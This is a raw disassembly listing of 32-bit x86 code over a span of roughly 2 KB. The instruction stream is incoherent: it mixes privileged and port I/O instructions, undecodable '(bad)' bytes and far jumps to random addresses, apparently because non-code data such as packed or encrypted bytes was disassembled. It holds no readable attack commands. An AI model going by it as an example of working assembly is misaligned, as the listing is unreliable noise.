  41bcb4:	clc    
  41bcb5:	into   
  41bcb6:	sub    DWORD PTR [ebx+0x6ad24c38],esi
  41bcbc:	sub    eax,0x2ef2b2a0
  41bcc1:	cld    
  41bcc2:	pop    esp
  41bcc3:	mov    ds:0x5a9e7fca,al
  41bcc8:	mov    esi,0xe2979afd
  41bccd:	pusha  
  41bcce:	int    0xc
  41bcd0:	mov    edi,0xe45f25a0
  41bcd5:	cld    
  41bcd6:	push   ebx
  41bcd7:	shl    DWORD PTR [edi-0x6d5e80f],1
  41bcdd:	inc    edx
  41bcde:	test   BYTE PTR [ecx+eax*1+0x7d0a0a5a],dl
  41bce5:	add    bh,BYTE PTR [esi+0x56234a3d]
  41bceb:	xlat   BYTE PTR ds:[ebx]
  41bcec:	dec    ecx
  41bced:	div    DWORD PTR [ebp+0x4c40a059]
  41bcf3:	mov    cl,0x11
  41bcf5:	daa    
  41bcf6:	ds js  0x41bd22
  41bcf9:	sbb    DWORD PTR [ebp+0x5127830e],esp
  41bcff:	sub    ecx,DWORD PTR [ebx-0x3f]
  41bd02:	in     eax,0x25
  41bd04:	icebp  
  41bd05:	ins    DWORD PTR es:[edi],dx
  41bd06:	xor    al,0xdc
  41bd08:	fidiv  DWORD PTR [edi+0x50]
  41bd0b:	data16 out 0x7e,al
  41bd0e:	mov    ah,0xfe
  41bd10:	inc    eax
  41bd11:	repz mov cs:0x626d0666,al
  41bd18:	jae    0x41bcba
  41bd1a:	rol    BYTE PTR [ebp+0x38],1
  41bd1d:	test   eax,0x13491d1d
  41bd22:	ins    BYTE PTR es:[edi],dx
  41bd23:	cmp    BYTE PTR [ebx+0x5b285568],bh
  41bd29:	inc    edx
  41bd2a:	push   esp
  41bd2b:	in     al,0x6f
  41bd2d:	aaa    
  41bd2e:	jl     0x41bd6b
  41bd30:	xchg   ebx,edx
  41bd32:	xchg   ebp,eax
  41bd33:	outs   dx,DWORD PTR ds:[esi]
  41bd34:	ror    BYTE PTR [edi-0x42],0x29
  41bd38:	in     al,0xca
  41bd3a:	std    
  41bd3b:	shl    DWORD PTR [edi-0x3],cl
  41bd3e:	push   ebp
  41bd3f:	mov    eax,0xeb30dbb5
  41bd44:	dec    esi
  41bd45:	mov    bl,0xfb
  41bd47:	mov    ebp,0x1bfc6862
  41bd4c:	fs rcl dh,1
  41bd4f:	dec    ecx
  41bd50:	cwde   
  41bd51:	lods   al,BYTE PTR ds:[esi]
  41bd52:	repz shr BYTE PTR [edx+0x74],cl
  41bd56:	cmp    eax,0x703692e3
  41bd5b:	out    dx,al
  41bd5c:	adc    DWORD PTR [ecx+0x6f2dc1ed],edx
  41bd62:	and    eax,0xf6fdbd8d
  41bd67:	shr    dl,0x0
  41bd6a:	call   0x55bc646a
  41bd6f:	push   esp
  41bd70:	out    0xf2,al
  41bd72:	cmp    eax,DWORD PTR [esi+0x719c8727]
  41bd78:	ret    0xb748
  41bd7b:	sbb    al,0xb0
  41bd7d:	mov    al,0x27
  41bd7f:	push   ebp
  41bd80:	pop    ebx
  41bd81:	sub    DWORD PTR [esi+0x75],ecx
  41bd84:	mov    edi,0x1659b64
  41bd89:	cmp    DWORD PTR [esi-0x54],ebp
  41bd8c:	mov    ecx,0x563492aa
  41bd91:	xor    ebx,DWORD PTR [edx]
  41bd93:	aad    0x90
  41bd95:	or     eax,0xe49c4682
  41bd9a:	mov    eax,ds:0xc87925b0
  41bd9f:	xor    DWORD PTR [eax],eax
  41bda1:	jmp    0x6db38fc8
  41bda6:	rcr    BYTE PTR [esi-0x59],1
  41bda9:	rsm    
  41bdab:	or     eax,0x555924b0
  41bdb0:	xchg   esp,eax
  41bdb1:	xor    edi,DWORD PTR [eax+0x62]
  41bdb4:	mov    eax,ds:0x5e80c27d
  41bdb9:	inc    edx
  41bdba:	mov    esi,0x5d25924f
  41bdbf:	cdq    
  41bdc0:	sub    eax,esi
  41bdc2:	fcmovnb st,st(1)
  41bdc4:	sbb    al,0xca
  41bdc6:	mov    al,0xed
  41bdc8:	add    DWORD PTR [edx],0xe4c48d67
  41bdce:	dec    edx
  41bdcf:	rcr    esp,1
  41bdd1:	and    bl,dl
  41bdd3:	dec    edi
  41bdd4:	imul   edx,DWORD PTR [ecx-0xabc6552],0xffffffcc
  41bddb:	inc    esp
  41bddc:	int3   
  41bddd:	(bad)  
  41bdde:	dec    esi
  41bddf:	fwait
  41bde0:	mov    DWORD PTR [ebp-0x1113c3e7],0xb7d41417
  41bdea:	test   al,0x40
  41bdec:	jae    0x41be1c
  41bdee:	jae    0x41bdcf
  41bdf0:	add    DWORD PTR [ebx-0x42],ebx
  41bdf3:	lds    edx,FWORD PTR [esi+ebp*1+0x39fa0998]
  41bdfa:	scas   eax,DWORD PTR es:[edi]
  41bdfb:	out    dx,eax
  41bdfc:	xchg   edx,esi
  41bdfe:	dec    edi
  41bdff:	pop    esp
  41be00:	cld    
  41be01:	cld    
  41be02:	iret   
  41be03:	cld    
  41be04:	std    
  41be05:	div    al
  41be07:	jmp    DWORD PTR [eax]
  41be09:	cmp    eax,0x3a260f5a
  41be0e:	and    dl,BYTE PTR [edi+0x4c332003]
  41be14:	es int3 
  41be16:	mov    ebp,0x384c2b43
  41be1b:	shl    BYTE PTR [ecx-0x40],0x39
  41be1f:	and    al,0x12
  41be21:	es pop edi
  41be23:	xor    DWORD PTR [eax],edi
  41be25:	xchg   edx,eax
  41be26:	mov    cl,0x36
  41be28:	mov    eax,0x1a2db85e
  41be2d:	mov    dh,0xc7
  41be2f:	mov    BYTE PTR [ecx+0x4f],dl
  41be32:	xchg   edx,eax
  41be33:	leave  
  41be34:	xor    eax,0xf085cfff
  41be39:	jb     0x41be49
  41be3b:	jno    0x41be5d
  41be3d:	jecxz  0x41be4d
  41be3f:	xchg   edi,eax
  41be40:	add    DWORD PTR [edx],edx
  41be42:	fs pusha 
  41be44:	xchg   esp,eax
  41be45:	das    
  41be46:	mov    ebx,0x50ac7149
  41be4b:	or     esi,DWORD PTR [ecx+0x33]
  41be4e:	out    0xec,al
  41be50:	in     eax,dx
  41be51:	sar    DWORD PTR [esi-0x3435d57],cl
  41be57:	lods   eax,DWORD PTR ds:[esi]
  41be58:	pop    edi
  41be59:	xor    BYTE PTR [ebp-0x9],bh
  41be5c:	push   ecx
  41be5d:	sti    
  41be5e:	adc    bl,0x70
  41be61:	adc    al,al
  41be63:	xor    dl,ch
  41be65:	dec    esi
  41be66:	jmp    0x9fc1:0x8c39a4f7
  41be6d:	add    ebp,esp
  41be6f:	ret    0x8f16
  41be72:	rcr    BYTE PTR [eax+eiz*1],0xce
  41be76:	mov    edx,DWORD PTR [ebx+0x4a]
  41be79:	je     0x41beb8
  41be7b:	sub    DWORD PTR [edi+0x40],edi
  41be7e:	jb     0x41be51
  41be80:	and    eax,0xa4f4aeb2
  41be85:	push   ebp
  41be86:	int3   
  41be87:	lea    eax,[esp+edx*2-0x8]
  41be8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be8c:	add    ecx,DWORD PTR [edi-0x2e]
  41be8f:	or     al,0xa8
  41be91:	popf   
  41be92:	adc    al,0x41
  41be94:	add    eax,0xf7624bf4
  41be99:	pop    ebp
  41be9a:	stos   BYTE PTR es:[edi],al
  41be9b:	hlt    
  41be9c:	jne    0x41be9f
  41be9e:	(bad)  
  41be9f:	fdivr  DWORD PTR ds:0x15bba45c
  41bea5:	aad    0xa8
  41bea7:	enter  0x65f7,0xfa
  41beab:	sbb    ebp,esp
  41bead:	iret   
  41beae:	cli    
  41beaf:	adc    ebx,esi
  41beb1:	fisub  WORD PTR [eax]
  41beb3:	test   DWORD PTR [ebx-0x27f6d831],ecx
  41beb9:	cmp    al,0x2d
  41bebb:	out    dx,eax
  41bebc:	xchg   DWORD PTR [ebp-0x80],ebp
  41bebf:	inc    ecx
  41bec0:	xchg   ebp,eax
  41bec1:	jnp    0x41bf09
  41bec3:	dec    ebp
  41bec4:	dec    esi
  41bec5:	shr    BYTE PTR [edi+edi*2+0x1c],1
  41bec9:	ja     0x41bee0
  41becb:	jnp    0x41beff
  41becd:	into   
  41bece:	xchg   DWORD PTR [edx+ebx*1],esp
  41bed1:	fadd   DWORD PTR [edx]
  41bed3:	mov    dh,0x9a
  41bed5:	repnz sbb DWORD PTR [bp+di+0x3810],0x5a63b55
  41bedf:	xchg   ebx,eax
  41bee0:	mov    cl,0x57
  41bee2:	jo     0x41bf42
  41bee4:	push   esi
  41bee5:	push   edx
  41bee6:	fmul   DWORD PTR [esi+0x58]
  41bee9:	push   ebx
  41beea:	sbb    BYTE PTR [ebx],0xd5
  41beed:	push   esp
  41beee:	outs   dx,BYTE PTR ds:[esi]
  41beef:	es inc esi
  41bef1:	cs iret 
  41bef3:	dec    edx
  41bef4:	out    dx,al
  41bef5:	aaa    
  41bef6:	xchg   BYTE PTR [edi-0x59],ch
  41bef9:	cmp    eax,0x831f9364
  41befe:	xor    dh,ah
  41bf00:	push   ecx
  41bf01:	xchg   edi,eax
  41bf02:	(bad)  
  41bf03:	jmp    0x41bf6d
  41bf05:	arpl   WORD PTR [edi+0x1a227d39],di
  41bf0b:	or     BYTE PTR [ecx-0x18977f8a],ah
  41bf11:	mov    bl,dh
  41bf13:	das    
  41bf14:	push   ss
  41bf15:	adc    BYTE PTR [esi],dh
  41bf17:	dec    ecx
  41bf18:	das    
  41bf19:	es mov eax,0x1020b451
  41bf1f:	aad    0x61
  41bf21:	cmp    DWORD PTR [ebx*4+0x4031f27c],ebx
  41bf28:	aam    0x3a
  41bf2a:	inc    edi
  41bf2b:	mov    edi,0x73f1f1ae
  41bf30:	(bad)  
  41bf32:	call   0x956e:0xce86e7d3
  41bf39:	mov    eax,ds:0xdb52d00d
  41bf3e:	test   eax,0xcc98e4b7
  41bf43:	stc    
  41bf44:	pop    es
  41bf45:	add    eax,0xc72d7e4
  41bf4a:	pop    ebx
  41bf4b:	pop    ebp
  41bf4c:	sub    al,0x46
  41bf4e:	xchg   DWORD PTR [edi+0x50a4e6e3],ebp
  41bf54:	stos   BYTE PTR es:[edi],al
  41bf55:	cmp    eax,ebx
  41bf57:	out    0x5,al
  41bf59:	call   0x5af2:0x4db84ec3
  41bf60:	jnp    0x41bf7d
  41bf62:	test   al,0xbe
  41bf64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf65:	or     BYTE PTR [ebx+0x2607d48c],dh
  41bf6b:	call   0x2c1:0x34befdbf
  41bf72:	imul   ecx,DWORD PTR [esi],0x10
  41bf75:	inc    edx
  41bf76:	dec    ecx
  41bf77:	ret    
  41bf78:	call   ecx
  41bf7a:	jo     0x41bf7a
  41bf7c:	fisub  WORD PTR [ecx]
  41bf7e:	dec    eax
  41bf7f:	repnz cld 
  41bf81:	imul   esp,DWORD PTR [eax+ebx*1],0xffffffb6
  41bf85:	xor    BYTE PTR [eax],ch
  41bf87:	(bad)  
  41bf88:	pop    ds
  41bf89:	icebp  
  41bf8a:	call   0x18740b5c
  41bf8f:	mov    ds:0x555984c,al
  41bf94:	addr16 mov cl,0xf
  41bf97:	jns    0x41c014
  41bf99:	loopne 0x41bf8e
  41bf9b:	iret   
  41bf9c:	lock xor al,0xcb
  41bf9f:	push   edx
  41bfa0:	dec    edi
  41bfa1:	add    dh,BYTE PTR [ebp-0x6d]
  41bfa4:	(bad)  
  41bfa5:	xchg   ebp,eax
  41bfa6:	aad    0x6b
  41bfa8:	pushf  
  41bfa9:	ror    esp,1
  41bfab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfac:	shl    DWORD PTR [ecx],1
  41bfae:	das    
  41bfaf:	loop   0x41bfec
  41bfb1:	cmp    ebx,esp
  41bfb3:	leave  
  41bfb4:	dec    ecx
  41bfb5:	dec    edi
  41bfb6:	out    dx,eax
  41bfb7:	ja     0x41c02e
  41bfb9:	retf   
  41bfba:	fldenv [esp+esi*4-0x62e84f90]
  41bfc1:	push   es
  41bfc2:	js     0x41bfea
  41bfc4:	stos   DWORD PTR es:[edi],eax
  41bfc5:	stos   DWORD PTR es:[edi],eax
  41bfc6:	out    dx,al
  41bfc7:	cmp    al,0xf7
  41bfc9:	fst    st(2)
  41bfcb:	mov    edx,0xb65b6fbf
  41bfd0:	adc    al,BYTE PTR [ebx-0x13]
  41bfd3:	ror    DWORD PTR [ebp+0x619cf1e2],0x32
  41bfda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfdb:	fs mov dh,0xea
  41bfde:	cmp    dh,bh
  41bfe0:	push   esi
  41bfe1:	out    0x98,eax
  41bfe3:	pop    ebp
  41bfe4:	ss sti 
  41bfe6:	test   DWORD PTR [ecx+0x5f],0x9f0e5111
  41bfed:	xlat   BYTE PTR ds:[ebx]
  41bfee:	(bad)  
  41bfef:	out    dx,eax
  41bff0:	in     eax,0x4c
  41bff2:	xchg   esi,eax
  41bff3:	and    dh,BYTE PTR [edx]
  41bff5:	or     eax,0xabc300e8
  41bffa:	pop    edi
  41bffb:	iret   
  41bffc:	xor    DWORD PTR [esi-0x7f],ecx
  41bfff:	inc    ebx
  41c000:	rcr    DWORD PTR [ebp-0x2140a146],1
  41c006:	push   esi
  41c007:	and    al,BYTE PTR [ecx+eax*4]
  41c00a:	in     al,dx
  41c00b:	std    
  41c00c:	jp     0x41bff9
  41c00e:	in     al,0xe3
  41c010:	(bad)  
  41c012:	nop
  41c013:	dec    esi
  41c014:	ins    DWORD PTR es:[edi],dx
  41c015:	not    DWORD PTR [ebx-0x6571d22d]
  41c01b:	add    eax,esp
  41c01d:	je     0x41bfa8
  41c01f:	test   al,0xd2
  41c021:	or     al,0x6f
  41c023:	xor    al,0x42
  41c025:	mul    edi
  41c027:	adc    BYTE PTR [eax-0x3470c3cf],dh
  41c02d:	and    al,0x9a
  41c02f:	ins    BYTE PTR es:[edi],dx
  41c030:	stos   DWORD PTR es:[edi],eax
  41c031:	fnstsw WORD PTR [eax]
  41c033:	bound  esp,QWORD PTR [esi]
  41c035:	mov    eax,edx
  41c037:	sahf   
  41c038:	mov    ds:0x613febf7,eax
  41c03d:	ret    0x11a
  41c040:	int3   
  41c041:	mov    ch,0x96
  41c043:	popa   
  41c044:	aaa    
  41c045:	iret   
  41c046:	mov    dl,0x75
  41c048:	pop    ds
  41c049:	cwde   
  41c04a:	dec    edi
  41c04b:	fild   WORD PTR [ebp+0x7ec0a378]
  41c051:	xor    edi,0x1f
  41c054:	mov    eax,0xc777c798
  41c059:	ret    
  41c05a:	and    eax,0x3392cecd
  41c05f:	lds    edi,FWORD PTR [ebx]
  41c061:	in     eax,dx
  41c062:	mov    eax,ds:0xb1d10458
  41c067:	add    al,0xf7
  41c069:	sbb    eax,0x32575464
  41c06e:	stc    
  41c06f:	sbb    edi,DWORD PTR [ebx]
  41c071:	int    0xfc
  41c073:	mov    ecx,0x3ea97518
  41c078:	imul   esp,DWORD PTR ds:0xbc314dea,0xffffffcc
  41c07f:	shl    DWORD PTR [edi-0x63],1
  41c082:	mov    ecx,0xaadf56bb
  41c087:	sub    DWORD PTR [edi+0x2e],0x759f83a7
  41c08e:	loope  0x41c062
  41c090:	sub    DWORD PTR [edi+eax*2-0x4658d41],ebp
  41c097:	call   0x41c2da55
  41c09c:	dec    esi
  41c09d:	rol    dh,1
  41c09f:	fiadd  WORD PTR [ecx-0x79]
  41c0a2:	inc    edx
  41c0a3:	mov    bl,0xf2
  41c0a5:	out    dx,eax
  41c0a6:	ss je  0x41c0f6
  41c0a9:	or     eax,0x3fbba6b4
  41c0ae:	adc    DWORD PTR [edx+0x3fc25166],esi
  41c0b4:	mov    ds:0x6c3c69df,eax
  41c0b9:	test   BYTE PTR [ecx-0x24d573b],dl
  41c0bf:	pushf  
  41c0c0:	push   esp
  41c0c1:	mov    bl,0x94
  41c0c3:	jecxz  0x41c056
  41c0c5:	sub    BYTE PTR [eax+0x241b4902],bl
  41c0cb:	imul   edi,edi,0x4951122f
  41c0d1:	cld    
  41c0d2:	shl    ch,0x3e
  41c0d5:	or     DWORD PTR [edx-0x74],eax
  41c0d8:	push   eax
  41c0d9:	or     esi,DWORD PTR [edi]
  41c0db:	xor    BYTE PTR [edx+0x2c362cd0],bl
  41c0e1:	not    BYTE PTR [edi+esi*8]
  41c0e4:	ins    BYTE PTR es:[edi],dx
  41c0e5:	sbb    DWORD PTR [esi+0x1b278411],esp
  41c0eb:	and    eax,0xc3a1fdf3
  41c0f0:	sub    DWORD PTR [edx+0xa],0x331be08c
  41c0f7:	xor    eax,0x28be073
  41c0fc:	scas   al,BYTE PTR es:[edi]
  41c0fd:	pop    ecx
  41c0fe:	ja     0x41c0fe
  41c100:	scas   al,BYTE PTR es:[edi]
  41c101:	pop    edx
  41c102:	pop    ebx
  41c103:	fnstenv [ebx-0x2862eb03]
  41c109:	adc    al,0x86
  41c10b:	sub    al,0x9d
  41c10d:	cmp    BYTE PTR [edi-0x11],bh
  41c110:	in     al,0xc9
  41c112:	inc    esp
  41c113:	mov    ecx,0x7186f5ca
  41c118:	or     al,0x49
  41c11a:	faddp  st(6),st
  41c11c:	sub    BYTE PTR [edx+eax*1+0x2e],ah
  41c120:	push   0xcf1e53e8
  41c125:	mov    edx,0x7cf18f80
  41c12a:	(bad)  
  41c12b:	push   edx
  41c12c:	jge    0x41c0de
  41c12e:	out    0xd,eax
  41c130:	xchg   esi,eax
  41c131:	fwait
  41c132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c133:	dec    edi
  41c134:	repnz in eax,0xe8
  41c137:	in     al,dx
  41c138:	or     DWORD PTR [ebx+0x46],0xffffffe8
  41c13c:	mov    bl,0xdf
  41c13e:	or     DWORD PTR [ecx],ecx
  41c140:	jns    0x41c173
  41c142:	cmp    al,0x8d
  41c144:	scas   eax,DWORD PTR es:[edi]
  41c145:	inc    ebx
  41c146:	mov    ds:0xbdcf8763,eax
  41c14b:	lods   eax,DWORD PTR ds:[esi]
  41c14c:	mov    dl,0x20
  41c14e:	out    0xbd,al
  41c150:	fs aaa 
  41c152:	jne    0x41c123
  41c154:	test   al,ah
  41c156:	jbe    0x41c0e6
  41c158:	pop    edi
  41c159:	and    eax,0xe68eaf09
  41c15e:	addr16 ret 
  41c160:	fwait
  41c161:	mov    ecx,0xe135df65
  41c166:	sub    eax,0xbba03030
  41c16b:	jmp    0x45928575
  41c170:	test   al,0xa4
  41c172:	popf   
  41c173:	xchg   ebx,eax
  41c174:	mov    dl,0xa8
  41c176:	adc    ebp,DWORD PTR [ebx]
  41c178:	fwait
  41c179:	xchg   ecx,eax
  41c17a:	imul   esp,edi,0x75
  41c17d:	cdq    
  41c17e:	neg    BYTE PTR [esi]
  41c180:	(bad)  
  41c181:	iret   
  41c182:	je     0x41c122
  41c184:	xchg   edi,eax
  41c185:	sar    DWORD PTR [esi],1
  41c187:	dec    esp
  41c188:	inc    eax
  41c189:	mov    ds:0xd86238d8,al
  41c18e:	mov    ecx,0xe917331e
  41c193:	jns    0x41c18a
  41c195:	pushf  
  41c196:	test   DWORD PTR ss:[edi+0x2d508c0a],esi
  41c19d:	shr    DWORD PTR [esi+0x3143391],0xa2
  41c1a4:	push   ebp
  41c1a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1a6:	test   eax,0xa2714971
  41c1ab:	mov    ds:0xf8c9fe0a,al
  41c1b0:	or     edi,DWORD PTR [ebp+0x65b138f4]
  41c1b6:	ret    0xf59d
  41c1b9:	bnd jns 0x41c228
  41c1bc:	or     BYTE PTR [ebx+0x3eb5773f],bl
  41c1c2:	cli    
  41c1c3:	in     eax,0x8e
  41c1c5:	dec    ecx
  41c1c6:	sbb    DWORD PTR [edi],edi
  41c1c8:	mov    dl,0x2c
  41c1ca:	mov    edi,0xa1256187
  41c1cf:	adc    al,0x11
  41c1d1:	js     0x41c1c3
  41c1d3:	sbb    DWORD PTR [esi+0x3686d29d],0xffffffa8
  41c1da:	pop    eax
  41c1db:	jmp    0x252:0x866e341a
  41c1e2:	inc    edi
  41c1e3:	cmp    eax,0x8c53b91b
  41c1e8:	mov    al,0xee
  41c1ea:	dec    edx
  41c1eb:	inc    esi
  41c1ec:	add    BYTE PTR [esi-0x77ba3d29],0x93
  41c1f3:	pushf  
  41c1f4:	stos   DWORD PTR es:[edi],eax
  41c1f5:	dec    dx
  41c1f7:	in     al,dx
  41c1f8:	jle    0x41c1ce
  41c1fa:	cmp    eax,DWORD PTR [eax-0x4e7ed95e]
  41c200:	(bad)  
  41c201:	mov    ch,0x8f
  41c203:	sahf   
  41c204:	inc    esp
  41c205:	jb     0x41c21e
  41c207:	inc    ebp
  41c208:	xchg   ebx,eax
  41c209:	retf   
  41c20a:	push   ebp
  41c20b:	sar    DWORD PTR [ecx],0xfd
  41c20e:	imul   edx,ecx,0xffffff91
  41c211:	rcl    cl,0x46
  41c214:	mov    BYTE PTR [edx+edi*2-0x50426d68],0xe3
  41c21c:	push   es
  41c21d:	mov    al,ds:0x921c60e4
  41c222:	mov    bh,0x6d
  41c224:	ror    DWORD PTR [edx+esi*2],1
  41c227:	add    al,0x2c
  41c229:	jmp    0xd3f883b2
  41c22e:	ins    BYTE PTR es:[edi],dx
  41c22f:	fisttp DWORD PTR [ebx-0x2a3a8635]
  41c235:	ficomp DWORD PTR [edi+0x16]
  41c238:	pop    edx
  41c239:	xor    bh,BYTE PTR [ebx-0x34]
  41c23c:	xchg   ebp,eax
  41c23d:	fisub  WORD PTR [eax+0x2a]
  41c240:	lahf   
  41c241:	sahf   
  41c242:	aad    0xdb
  41c244:	pop    ss
  41c245:	(bad)  
  41c246:	shl    BYTE PTR [ebx+0x739d38f2],1
  41c24c:	cli    
  41c24d:	in     eax,dx
  41c24e:	(bad)  
  41c24f:	xlat   BYTE PTR ds:[ebx]
  41c250:	cmp    bh,BYTE PTR ds:0x36aa484
  41c256:	dec    edx
  41c257:	xor    ebx,eax
  41c259:	mov    esi,0x6cb714b
  41c25e:	rcl    DWORD PTR [edx-0x71],cl
  41c261:	or     BYTE PTR [edx],dh
  41c263:	jae    0x41c2cf
  41c265:	mov    es,WORD PTR [esi+0x4e46ab62]
  41c26b:	dec    eax
  41c26c:	inc    esi
  41c26d:	add    al,0xe3
  41c26f:	pop    esp
  41c270:	addr16 push esi
  41c272:	es in  eax,0xb9
  41c275:	aam    0x5b
  41c277:	clc    
  41c278:	out    0x63,al
  41c27a:	mov    eax,0x8d8cc997
  41c27f:	mov    cl,0x57
  41c281:	int    0xb
  41c283:	xor    BYTE PTR [edx+0x68],0xf2
  41c287:	lods   eax,DWORD PTR ds:[esi]
  41c288:	mov    dh,0x66
  41c28a:	sbb    al,dh
  41c28c:	inc    ebp
  41c28d:	jecxz  0x41c286
  41c28f:	enter  0x2d8d,0xfe
  41c293:	ins    BYTE PTR es:[edi],dx
  41c294:	out    dx,eax
  41c295:	sar    DWORD PTR [edx-0x7f30580a],cl
  41c29b:	mov    ds:0xaa8f758a,eax
  41c2a0:	call   0xd12e:0x97c4b95f
  41c2a7:	jmp    0x4a8e:0xeda59122
  41c2ae:	inc    ebp
  41c2af:	pop    esi
  41c2b0:	adc    ebx,DWORD PTR [esi+edx*4]
  41c2b3:	adc    bl,dl
  41c2b5:	aaa    
  41c2b6:	add    DWORD PTR [ebx+0x25],esi
  41c2b9:	sub    eax,0x6d197c2
  41c2be:	push   ebp
  41c2c0:	mov    bl,0xb3
  41c2c2:	dec    ecx
  41c2c3:	sub    bh,cl
  41c2c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2c6:	sub    dh,BYTE PTR [ebx-0x4]
  41c2c9:	sahf   
  41c2ca:	packssdw mm1,QWORD PTR [ebx-0x3a]
  41c2ce:	lds    eax,FWORD PTR [ebx+0x1706ad56]
  41c2d4:	jp     0x41c2e1
  41c2d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2d7:	(bad)  
  41c2d8:	or     eax,0x91fd52c4
  41c2dd:	jge    0x41c279
  41c2df:	cli    
  41c2e0:	jmp    0xfd1c:0xaacd4f52
  41c2e7:	std    
  41c2e8:	int3   
  41c2e9:	mov    edi,0x58a20f9
  41c2ee:	ret    
  41c2ef:	pop    es
  41c2f0:	sub    ch,bl
  41c2f2:	jmp    0x15b0:0xc5acecb9
  41c2f9:	and    BYTE PTR [ecx-0x7bf3516],dl
  41c2ff:	inc    edi
  41c300:	add    ah,0xba
  41c303:	inc    edi
  41c304:	mov    ds:0xfa3c3cff,al
  41c309:	pop    esi
  41c30a:	cmp    bh,bl
  41c30c:	neg    BYTE PTR [ecx+0xa5ff44e]
  41c312:	xchg   edi,eax
  41c313:	cs xchg esi,eax
  41c315:	je     0x41c380
  41c317:	pop    esi
  41c318:	xor    bh,dl
  41c31a:	fwait
  41c31b:	cmp    DWORD PTR [edx-0x66],ebp
  41c31e:	inc    esi
  41c31f:	add    esi,DWORD PTR [ebx-0x3f56fddf]
  41c325:	add    al,0xd1
  41c327:	adc    BYTE PTR [ebx],dl
  41c329:	adc    BYTE PTR [esi+0x4e4db9ba],ch
  41c32f:	push   esi
  41c330:	aaa    
  41c331:	retf   0x3051
  41c334:	ss add eax,0x899746d0
  41c33a:	out    dx,eax
  41c33b:	jge    0x41c2c3
  41c33d:	out    dx,eax
  41c33e:	loopne 0x41c303
  41c340:	dec    edi
  41c341:	mov    ebx,DWORD PTR ds:0xfe686c48
  41c347:	sub    al,0xc
  41c349:	xchg   ecx,eax
  41c34a:	adc    dl,BYTE PTR [ebx]
  41c34c:	sbb    eax,0xe01b2efa
  41c351:	not    DWORD PTR [eax-0x7e5e6c69]
  41c357:	in     al,0xb7
  41c359:	aam    0x56
  41c35b:	out    0x1d,al
  41c35d:	repnz stos BYTE PTR es:[edi],al
  41c35f:	or     eax,0xe63759d4
  41c364:	call   0xefc:0x3bd56ebf
  41c36b:	dec    bh
  41c36d:	xchg   esp,eax
  41c36e:	sahf   
  41c36f:	and    ecx,DWORD PTR [ecx-0x6697a6f8]
  41c375:	or     al,0x4
  41c377:	stos   DWORD PTR es:[edi],eax
  41c378:	aam    0x32
  41c37a:	jbe    0x41c35f
  41c37c:	push   esp
  41c37d:	sar    BYTE PTR [esi+0x296d8a1d],1
  41c383:	dec    ebp
  41c384:	mov    esp,DWORD PTR [edx+0x38]
  41c387:	dec    ecx
  41c388:	rcr    DWORD PTR [ecx+edi*8],0x62
  41c38c:	(bad)  
  41c38d:	sbb    BYTE PTR [eax-0x965437],bh
  41c393:	leave  
  41c394:	pop    ds
  41c395:	shl    cl,0xb4
  41c398:	rol    ah,0xb9
  41c39b:	into   
  41c39c:	shl    BYTE PTR [edx+0x7a],cl
  41c39f:	ret    0xfc2e
  41c3a2:	mov    DWORD PTR [eax],ebx
  41c3a4:	inc    esp
  41c3a5:	popa   
  41c3a6:	mov    cl,0x70
  41c3a8:	xor    DWORD PTR [ecx],esp
  41c3aa:	clc    
  41c3ab:	adc    BYTE PTR [ebp+0x4b22a5a5],dh
  41c3b1:	out    0x4f,al
  41c3b3:	fsub   QWORD PTR [esi]
  41c3b5:	mov    ds:0xe7571671,al
  41c3ba:	push   eax
  41c3bb:	inc    edx
  41c3bc:	add    al,0x6a
  41c3be:	in     al,0x60
  41c3c0:	push   ebx
  41c3c1:	mov    WORD PTR [eax-0x7de1d40],ds
  41c3c7:	jnp    0x41c405
  41c3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3ca:	jnp    0x41c401
  41c3cc:	es jg  0x41c37f
  41c3cf:	add    BYTE PTR [bx+si+0x62],al
  41c3d3:	mov    cl,0xae
  41c3d5:	mov    ds:0x9831db1c,al
  41c3da:	daa    
  41c3db:	stos   DWORD PTR es:[edi],eax
  41c3dc:	sbb    al,0x29
  41c3de:	out    dx,al
  41c3df:	imul   ecx,DWORD PTR [ebx+eiz*1-0x49],0x7a
  41c3e4:	inc    ebx
  41c3e5:	adc    eax,0x58e4f49c
  41c3ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3ec:	arpl   WORD PTR [edx],dx
  41c3ee:	loop   0x41c424
  41c3f0:	pushf  
  41c3f1:	js     0x41c391
  41c3f3:	enter  0x440d,0x64
  41c3f7:	in     al,0xf8
  41c3f9:	xlat   BYTE PTR ds:[ebx]
  41c3fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3fb:	repnz cmp eax,0xb33a5183
  41c401:	cld    
  41c402:	ret    0xe7b9
  41c405:	xchg   DWORD PTR [ecx+0x2a],ecx
  41c408:	or     DWORD PTR [ebx],edi
  41c40a:	jl     0x41c41a
  41c40c:	stc    
  41c40d:	cmc    
  41c40e:	sub    eax,0xeb834ac8
  41c413:	jo     0x41c403
  41c415:	xchg   BYTE PTR [eax],bl
  41c417:	rcr    BYTE PTR [eax],0x70
  41c41a:	pushf  
  41c41b:	in     eax,dx
  41c41c:	jmp    0x698cad25
  41c421:	inc    esp
  41c422:	adc    esp,DWORD PTR [ebp+0x6f]
  41c425:	add    al,0x42
  41c427:	dec    ebp
  41c428:	or     eax,0xc6d3c512
  41c42d:	inc    ebp
  41c42e:	or     dh,ch
  41c430:	pop    es
  41c431:	xor    eax,0xae1a53aa
  41c436:	fiadd  WORD PTR [edx+0x59]
  41c439:	popf   
  41c43a:	mov    BYTE PTR [eax+0x69f7b624],dl
  41c440:	jg     0x41c458
  41c442:	inc    ebp
  41c443:	idiv   BYTE PTR [edi+0x1e6d1eb7]
  41c449:	xchg   edx,eax
  41c44a:	inc    eax
  41c44b:	inc    eax
  41c44c:	sbb    ecx,DWORD PTR [eax+0x610d5123]
  41c452:	nop
  41c453:	cs mov esi,0xc2e115d5
